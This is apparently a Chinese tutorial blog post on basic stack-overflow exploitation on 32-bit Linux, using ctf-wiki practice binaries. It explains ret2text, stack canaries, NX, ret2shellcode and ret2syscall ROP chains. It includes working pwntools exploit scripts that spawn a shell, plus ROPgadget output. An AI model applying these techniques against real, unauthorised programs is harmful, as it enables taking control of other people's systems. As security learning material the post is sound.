+ 80491ba:       c3                      ret    </code></pre><p>在调用<code>gets</code>函数之前，程序通过<code>lea eax, [ebx-0x18]</code>指令将<code>[ebx-0x18]</code>这个地址放入了<code>eax</code>寄存器中。接下来，<code>eax</code>被压入栈中。也就是传递给函数<code>gets</code>的参数是<code>eax</code>即<code>[ebx-0x18]</code>这个地址。这个地址实际上就是字符串读入的位置也就是变量<code>input</code>。</p><p>那么如果我们读入0x18个字符，便会正好覆盖到ebx的位置上方：</p><p><img data-src="test_gets1.jpg"></p><p>如果多覆盖一些则会溢出到返回地址中：</p><p><img data-src="test_gets2.jpg"></p><p>可以看到程序返回到了我们写上去的地址：</p><pre><code>   0x80491b5 &lt;bad_test+18&gt;    add    esp, 0x10
+   0x80491b8 &lt;bad_test+21&gt;    nop    
+   0x80491b9 &lt;bad_test+22&gt;    leave  
+ ► 0x80491ba &lt;bad_test+23&gt;    ret    &lt;0x37373737&gt; ; 0x37373737=&quot;7777&quot;</code></pre><p>那么我们只需要去构造一个输入的字符串<code>"a"*(0x18 + 0x4) + addr(impossible)</code>就行了：</p><div class="sourceCode" id="cb21"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>target <span class="op">=</span> process(<span class="st">&#39;./a.out&#39;</span>) <span class="co"># 目标</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>target_addr <span class="op">=</span> <span class="bn">0x08049186</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">b&quot;a&quot;</span><span class="op">*</span><span class="dv">28</span><span class="op">+</span>p32(target_addr)</span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>target.sendline(payload) <span class="co"># 发送payload</span></span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a>target.interactive() <span class="co"># 开启交互</span></span></code></pre></div><p>可见我们使得程序跳转到了<code>impossible</code>函数并运行了里面的<code>execve</code>命令。</p><p><img data-src="gets_exp.jpg"></p><p>获取控制权，达成。这个例子实际上控制程序跳转到<code>.text</code>段中的已有的代码，这个手段也就是被称为<code>ret2text</code>。这种利用<code>ret</code>指令的跳转来构造特定控制流的方法叫做ROP（Return Oriented Programming）。</p><h2 id="事实上安全检查关闭了">事实上安全检查关闭了</h2><p>前面其实有一个问题并没有说明：在前面的测试中，安全检查是已经被关闭的。</p><p>我们在使用gcc编译程序的时候，设置了<code>-fno-stack-protector</code>选项，这个操作禁用了栈溢出的防护。在编译时去掉这个选项，执行脚本时程序报错：</p><pre><code>*** stack smashing detected ***: terminated</code></pre><p>这个安全机制被称为canary（金丝雀）。过去在矿井中，一些矿工会携带一只金丝雀。因为金丝雀对矿井中的有毒气体非常敏感，当有毒气体浓度增加，金丝雀会中毒而死，而矿工可以得到警告逃离危险区域。</p><p>对于这段程序：</p><div class="sourceCode" id="cb23"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> bad_test<span class="op">()&#123;</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> input<span class="op">[</span><span class="dv">4</span><span class="op">];</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>    gets<span class="op">(</span>input<span class="op">);</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p>我们来看一下设置了canary之后程序的变化：</p><pre class="x86asm"><code>08049186 &lt;bad_test&gt;:
+ 8049186:       55                      push   ebp
+ 8049187:       89 e5                   mov    ebp,esp
+    ; 上面两行是正常的函数序言
+ 8049189:       83 ec 18                sub    esp,0x18
+    ; 建立函数的栈帧
+ 804918c:       65 a1 14 00 00 00       mov    eax,gs:0x14
+ 8049192:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
+    ; 这两条指令就是设置了canary
+    ; 从gs段读取了一个值放入eax，再把这个值写入栈[ebp-0xc]的位置
+ 8049195:       31 c0                   xor    eax,eax
+ 8049197:       83 ec 0c                sub    esp,0xc
+ 804919a:       8d 45 f0                lea    eax,[ebp-0x10]
+ 804919d:       50                      push   eax
+ 804919e:       e8 ad fe ff ff          call   8049050 &lt;gets@plt&gt;
+ 80491a3:       83 c4 10                add    esp,0x10
+ 80491a6:       90                      nop
+    ; 函数实际功能的执行
+ 80491a7:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
+ 80491aa:       65 2b 05 14 00 00 00    sub    eax,DWORD PTR gs:0x14
+    ; 将现在栈上的canary和来源的地方比较一下
+ 80491b1:       74 05                   je     80491b8 &lt;bad_test+0x32&gt;
+    ; 如果相等就跳转到leave指令
+ 80491b3:       e8 a8 fe ff ff          call   8049060 &lt;__stack_chk_fail@plt&gt;
+    ; 否则执行__stack_chk_fail函数，也就是发现了栈溢出
+ 80491b8:       c9                      leave  
+ 80491b9:       c3                      ret   </code></pre><p>如果程序出现栈溢出的话，在EBP和返回地址被覆盖之前，Canary就已经被改变了，这样程序的控制流就会转入<code>__stack_chk_fail</code>中，这个函数会执行错误处理操作并停止程序的继续运行，避免被攻击者利用。</p><p>如果我们用checksec之类的工具来查看的话，可以看到程序的各个安全参数：</p><pre><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable      FILE
+Partial RELRO   Canary found    NX enabled      No PIE          No RPATH   No RUNPATH   83) Symbols       No    0               2               ret2text</code></pre><h1 id="如果不是ret2text">如果不是ret2text</h1><p>在实际的程序里一般是不会像上面那样留一个大大的<code>execve('/bin/sh')</code>的后门的。这种程序里没有直接留下可以被调用的代码的情况，可能得需要自己去构造一个后门来插进去。</p><p>一种思路是<strong>ret2shellcode</strong>，也就是控制程序返回到我们设置的shellcode中。这个shellcode实际上就是我们设置的能够完成一些功能（比如说拿到权限）的一串代码。</p><p>这种思路的实现条件还算是比较苛刻——我们shellcode设置的位置需要能够被执行。怎么去理解这个问题呢？</p><p>现在许多系统都有数据执行保护（Data Execution Prevention, DEP），这个保护的作用是防止攻击者修改正在执行的程序指令。内存中的一些区块会有一个NX标记（<strong>N</strong>o E<strong>X</strong>ecution），表明这个区块是不可执行的。较多的情况下，一个程序应该满足能够被写入的区块不可被执行，能够被执行的区块不可被写入。</p><p>上面一个程序checksec返回的结果就显示<code>NX enabled</code>，也就是说像栈这种可以被写入的区块上面的内容不可以被作为指令来执行。</p><p>拿<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">这个</a>程序来说。</p><p>拖进IDA反汇编之后得到：</p><div class="sourceCode" id="cb26"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> __cdecl main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">**</span>envp<span class="op">)</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="op">&#123;</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> s<span class="op">[</span><span class="dv">100</span><span class="op">];</span> <span class="co">// [esp+1Ch] [ebp-64h] BYREF</span></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>stdout<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">2</span><span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>stdin<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">1</span><span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot;No system for you this time !!!&quot;</span><span class="op">);</span></span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>  gets<span class="op">(</span>s<span class="op">);</span>  <span class="co">// 可以溢出</span></span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a>  strncpy<span class="op">(</span>buf2<span class="op">,</span> s<span class="op">,</span> <span class="bn">0x64</span><span class="bu">u</span><span class="op">);</span> <span class="co">// 将栈上临时变量s里面的数据复制到buf2里面，buf2在bss段</span></span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;bye bye ~&quot;</span><span class="op">);</span></span>
+<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb26-12"><a href="#cb26-12" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p>通过checksec我们会看到程序基本上处于无保护的状态：</p><pre><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   79) Symbols       No    0               3               ret2shellcode</code></pre><p>通过IDA查看可以发现变量<code>buf2</code>在<code>.bss</code>段上：</p><p><img data-src="ret2shellcode.jpg"></p><p>通过gdb调试之后可以注意到这里是可以被执行的：</p><pre><code>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+ 0x8048000  0x8049000 r-xp     1000 0      /home/syml/Temp/ret2shellcode
+ 0x8049000  0x804a000 r--p     1000 0      /home/syml/Temp/ret2shellcode
+ 0x804a000  0x804b000 rw-p     1000 1000   /home/syml/Temp/ret2shellcode &lt;==在这里
+                       ^ 可以被执行的</code></pre><p>那么我们可以这样来进行攻击：构造一段可以被执行的shellcode，通过<code>gets</code>函数读入<code>s</code>变量中，同时产生一个栈溢出，让<code>main</code>函数的返回地址指向.bss段的<code>buf2</code>变量的位置。接下来程序会将<code>s</code>的shellcode复制到<code>buf2</code>中。这样，在main函数返回的时候，就会跳转到.bss段的<code>buf2</code>变量位置执行我们的shellcode。</p><p>我们可以直接使用pwntools构造shellcode：</p><div class="sourceCode" id="cb29"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">=</span> asm(shellcraft.sh())</span></code></pre></div><p>接下来就是构造栈溢出：</p><pre><code> 804858c:       8d 44 24 1c             lea    eax,[esp+0x1c]
+ 8048590:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048593:       e8 38 fe ff ff          call   80483d0 &lt;gets@plt&gt;</code></pre><p>通过objdump查看main函数的汇编可以看到，在执行<code>gets</code>函数前被压入栈中的eax存放的就是字符串<code>char s[]</code>的地址。这个地址是相对于<code>esp</code>的偏移，而需要构造payload我们要知道相对于ebp的偏移。我们可以通过动态调试得到偏移：</p><p><img data-src="ret2shellcode_offset.jpg"></p><p>可以看出来，<code>esp</code>相对于<code>ebp</code>的偏移是<code>0xffffcf58-0xffffced0=0x88</code>，<code>char s[]</code>相对于<code>esp</code>的偏移是<code>0x1c</code>，那么<code>char s[]</code>相对于<code>ebp</code>的偏移就是<code>0x88-0x1c=0x6c</code>。再加上<code>EBP</code>占据的4个字节，所以返回地址的位置就在偏移<code>0x70</code>的位置上。</p><p>另外一种简单的方法是直接使用pwntools的功能：通过<code>pwn cyclic 200</code>这样的命令生成足够长度的字符串，输入进去之后会出现栈溢出，这个时候去查看<code>EIP</code>的值，通过<code>pwn cyclic -l &lt;pattern&gt;</code>就可以知道偏移。</p><p>所以说构造的栈溢出的payload应该是：<code>shellcode+'A'补全0x70+buf的地址</code>。</p><p>可以构造payload：</p><div class="sourceCode" id="cb31"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a>target <span class="op">=</span> process(<span class="st">&#39;./ret2shellcode&#39;</span>)</span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">=</span> asm(shellcraft.sh())</span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a>target_addr <span class="op">=</span> <span class="bn">0x0804a080</span></span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> shellcode.ljust(<span class="dv">112</span>, <span class="st">b&#39;A&#39;</span>) <span class="op">+</span> p32(target_addr)</span>
+<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a>target.sendline(payload)</span>
+<span id="cb31-9"><a href="#cb31-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb31-10"><a href="#cb31-10" aria-hidden="true" tabindex="-1"></a>target.interactive()</span></code></pre></div><p>ok。拿张图说明一下：</p><p><img data-src="ret2shellcode_explain.jpg"></p><h1 id="更进一步ret2syscall">更进一步，ret2syscall</h1><p>前面的ret2shellcode有着比较严格的条件，就是要求NX disabled。如果程序设置了数据执行保护，那么这种方式就无法实现了。</p><p>一个思路是去构造ROP chain。ROP chain可以利用程序中间的一系列ret指令来实现修改寄存器、进行系统调用等功能。</p><p><img data-src="ropchain.jpg"></p><p>如果我们想要进行一个系统调用的话，我们需要给一些寄存器设定好参数。32位系统调用execve的时候，系统调用号<code>EAX</code>为<code>0xb</code>，<code>EBX</code>为一个指向<code>/bin/sh</code>（或者你要调用的命令）的指针，<code>ECX</code>和<code>EDX</code>都是0，设置好四个寄存器之后，执行指令<code>int 0x80</code>就可以进行系统调用了。</p><p>以设置EAX为例，我们寻找到一段代码<code>pop eax; ret</code>。接下来我们向栈中压入（溢出）三个数据：<code>返回地址</code>，<code>0xb</code>，前面代码段的地址。</p><p>这样，我们运行到<code>ret</code>语句时，就会跳转到<code>pop eax; ret</code>，执行完<code>pop eax</code>之后，现在栈顶的<code>0xb</code>弹出进入<code>eax</code>，接下来再<code>ret</code>到我们设置的地址。这样子我们也就完成了一个寄存器的修改。</p><p>以这个<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">程序</a>为例。</p><p>拖进IDA进行反编译，看到<code>main</code>函数存在栈溢出：</p><div class="sourceCode" id="cb32"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> __cdecl main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">,</span> <span class="dt">const</span> <span class="dt">char</span> <span class="op">**</span>envp<span class="op">)</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="op">&#123;</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> v4<span class="op">;</span> <span class="co">// [esp+1Ch] [ebp-64h] BYREF</span></span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>stdout<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">2</span><span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a>  setvbuf<span class="op">(</span>stdin<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">1</span><span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span><span class="op">);</span></span>
+<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot;What do you plan to do?&quot;</span><span class="op">);</span></span>
+<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a>  gets<span class="op">(&amp;</span>v4<span class="op">);</span></span>
+<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb32-11"><a href="#cb32-11" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div><p>同时跑一下checksec：</p><pre><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2255) Symbols     No    0               0               rop</code></pre><p>程序开启了NX，那么也就不能ret2shellcode。</p><pre><code> EBP  0xffffd598 —▸ 0x8049630 (__libc_csu_fini) ◂— push   ebx
+ ESP  0xffffd510 —▸ 0xffffd52c ◂— 0x3</code></pre><p>通过gdb调试可以发现，返回地址相对于数组<code>v4</code>基址的偏移还是<code>0xffffd598-0xffffd510-0x1c+0x4=0x70</code>。</p><p>那么我们就开始构造一个ROP chain：</p><p>首先需要设置<code>EAX</code>的值为0xb，我们通过ROP gadget寻找这样的指令序列：</p><pre><code>$ ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;eax&#39;    
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x080bb196 : pop eax ; ret
+0x0807217a : pop eax ; ret 0x80e
+0x0804f704 : pop eax ; ret 3
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</code></pre><p>我们选择第二个。</p><p>接下来同样，寻找设置<code>EBX</code>的指令序列：</p><pre><code>$ ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;ebx&#39;    
+0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
+......
+0x08049a94 : pop ebx ; pop esi ; ret
+0x080481c9 : pop ebx ; ret
+0x080d7d3c : pop ebx ; ret 0x6f9
+0x08099c87 : pop ebx ; ret 8
+......
+0x0807b6ed : pop ss ; pop ebx ; ret</code></pre><p>寻找设置ECX的指令序列：</p><pre><code>$ ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;ecx&#39; 
+0x0806eb91 : pop ecx ; pop ebx ; ret
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></pre><p>发现第二条指令能够同时设置<code>EBX,ECX,EDX</code>，我们就直接选择这一条。</p><p>以及字符串'/bin/sh'：</p><pre><code>$ ROPgadget --binary rop --string &#39;/bin/sh&#39; 
+Strings information
+============================================================
+0x080be408 : /bin/sh</code></pre><p>还有syscall(int 0x80)：</p><pre><code>$ ROPgadget --binary rop --only &#39;int&#39;  
+Gadgets information
+============================================================
+0x08049421 : int 0x80
+
+Unique gadgets found: 1</code></pre><p>接下来就是关于指令的顺序：在栈溢出之后ret，程序会先执行我们设置的地址处的指令<code>pop eax ; ret</code>，然后执行<code>pop edx ; pop ecx ; pop ebx ; ret</code>，最后执行<code>int 0x80</code>。</p><p>栈上应该是这样的布局：</p><pre><code>+----------+
+|0x080bb196| =&gt; pop eax ; ret
++----------+
+|0x0000000b| =&gt; EAX=0xb
++----------+
+|0x0806eb90| =&gt; pop edx ; pop ecx ; pop ebx ; ret 
++----------+
+|0x00000000| =&gt; EDX=0x0
++----------+
+|0x00000000| =&gt; ECX=0x0
++----------+
+|0x080be408| =&gt; EBX=0x080be408 -&gt; &#39;/bin/sh&#39;
++----------+
+|0x08049421| =&gt; int 0x80
++----------+</code></pre><p>这样我们可以编写脚本：</p><div class="sourceCode" id="cb41"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a>sh <span class="op">=</span> process(<span class="st">&#39;./rop&#39;</span>)</span>
+<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb41-5"><a href="#cb41-5" aria-hidden="true" tabindex="-1"></a>chains <span class="op">=</span> p32(<span class="bn">0x80bb196</span>) <span class="op">+</span> p32(<span class="bn">0xb</span>) <span class="op">+</span> p32(<span class="bn">0x806eb90</span>) <span class="op">+</span> p32(<span class="bn">0x0</span>) <span class="op">+</span> p32(<span class="bn">0x0</span>) <span class="op">+</span> p32(<span class="bn">0x80be408</span>) <span class="op">+</span> p32(<span class="bn">0x8049421</span>)</span>
+<span id="cb41-6"><a href="#cb41-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb41-7"><a href="#cb41-7" aria-hidden="true" tabindex="-1"></a>sh.sendline(<span class="st">b&quot;A&quot;</span> <span class="op">*</span> <span class="dv">112</span> <span class="op">+</span> chains)</span>
+<span id="cb41-8"><a href="#cb41-8" aria-hidden="true" tabindex="-1"></a>sh.interactive()</span></code></pre></div><p>运行，getshell.</p><p><img data-src="rop_exp.jpg"></p><h1 id="参考资料">参考资料</h1><p>[1] https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</p><div class="tags"><a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i> Pwn</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">Edited on</span> <time title="Modified: 2022-03-29 23:20:21" itemprop="dateModified" datetime="2022-03-29T23:20:21+08:00">2022-03-29</time> </span><span id="2022/03/28/stackoverflow-learn/" class="item leancloud_visitors" data-flag-title="关于栈溢出的一些东西（基本的）" title="Views"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">Views</span> <span class="leancloud-visitors-count"></span> <span class="text">times</span></span></div><div id="copyright"><ul><li class="author"><strong>Post author: </strong>symlPigeon <i class="ic i-at"><em>@</em></i>symlpigeon's little gensokyo</li><li class="link"><strong>Post link: </strong><a href="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/" title="关于栈溢出的一些东西（基本的）">http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/</a></li><li class="license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/03/23/mpc-gmw/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;large&#x2F;8f9c6cc1ly8h18bzlvwthj21gi0u0qf9.jpg" title="多方安全计算——GMW协议"><span class="type">Previous Post</span> <span class="category"><i class="ic i-flag"></i> 密码学</span><h3>多方安全计算——GMW协议</h3></a></div><div class="item right"><a href="/2022/03/30/stackoverflow-ret2libc/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;large&#x2F;8f9c6cc1ly8h18bzht0lkj20yg0odjwe.jpg" title="栈溢出，ret2libc"><span class="type">Next Post</span> <span class="category"><i class="ic i-flag"></i> 二进制</span><h3>栈溢出，ret2libc</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="Contents"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%80%8E%E4%B9%88%E5%B0%B1%E6%BA%A2%E5%87%BA%E4%BA%86"><span class="toc-number">1.</span> <span class="toc-text">栈怎么就溢出了</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%98%E6%9C%89%E8%BF%94%E5%9B%9E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88"><span class="toc-number">1.1.</span> <span class="toc-text">函数的调用还有返回发生了什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%A0%88%E5%A1%9E%E4%B8%8D%E4%B8%8B%E4%BA%86"><span class="toc-number">1.2.</span> <span class="toc-text">如果栈塞不下了……</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%83%BD%E4%B8%8D%E8%83%BD%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">能不能利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E6%98%AF%E4%B8%8D%E6%98%AF%E5%87%BA%E9%97%AE%E9%A2%98%E4%BA%86"><span class="toc-number">2.1.</span> <span class="toc-text">控制流是不是出问题了？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%9C%89%E8%BE%93%E5%85%A5%E7%9A%84%E8%AF%9D%E7%84%B6%E5%90%8Eret2text"><span class="toc-number">2.2.</span> <span class="toc-text">如果有输入的话，然后ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E5%AE%9E%E4%B8%8A%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E5%85%B3%E9%97%AD%E4%BA%86"><span class="toc-number">2.3.</span> <span class="toc-text">事实上安全检查关闭了</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%98%AFret2text"><span class="toc-number">3.</span> <span class="toc-text">如果不是ret2text</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E8%BF%9B%E4%B8%80%E6%AD%A5ret2syscall"><span class="toc-number">4.</span> <span class="toc-text">更进一步，ret2syscall</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol></div><div class="related panel pjax" data-title="Related"><ul><li><a href="/2022/01/20/re-review1/" rel="bookmark" title="IA32内存、寄存器、数据">IA32内存、寄存器、数据</a></li><li><a href="/2022/02/10/re-review2/" rel="bookmark" title="ELF格式学习">ELF格式学习</a></li><li><a href="/2022/02/15/re-call/" rel="bookmark" title="关于x86调用惯例是啥这件事">关于x86调用惯例是啥这件事</a></li><li><a href="/2022/03/22/program-start/" rel="bookmark" title="关于一个ELF程序是怎么启动的这件事以及尝试分析然后大失败的结果">关于一个ELF程序是怎么启动的这件事以及尝试分析然后大失败的结果</a></li><li class="active"><a href="/2022/03/28/stackoverflow-learn/" rel="bookmark" title="关于栈溢出的一些东西（基本的）">关于栈溢出的一些东西（基本的）</a></li><li><a href="/2022/03/30/stackoverflow-ret2libc/" rel="bookmark" title="栈溢出，ret2libc">栈溢出，ret2libc</a></li><li><a href="/2022/04/07/typora-reverse-engineering/" rel="bookmark" title="针对Typora的逆向分析">针对Typora的逆向分析</a></li></ul></div><div class="overview panel" data-title="Overview"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="symlPigeon" data-src="/images/avatar.png"><p class="name" itemprop="name">symlPigeon</p><div class="description" itemprop="description">计算机、数学、人生还有碎碎念，网络中的一片个人保留地。</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">17</span> <span class="name">posts</span></a></div><div class="item categories"><a href="/categories/"><span class="count">3</span> <span class="name">categories</span></a></div><div class="item tags"><a href="/tags/"><span class="count">9</span> <span class="name">tags</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N5bWxwaWdlb24=" title="https:&#x2F;&#x2F;github.com&#x2F;symlpigeon"><i class="ic i-github"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTU0MDkxMzE0NA==" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;540913144"><i class="ic i-cloud-music"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjIxNjM5NTMwNzRAcXEuY29t" title="mailto:2163953074@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" 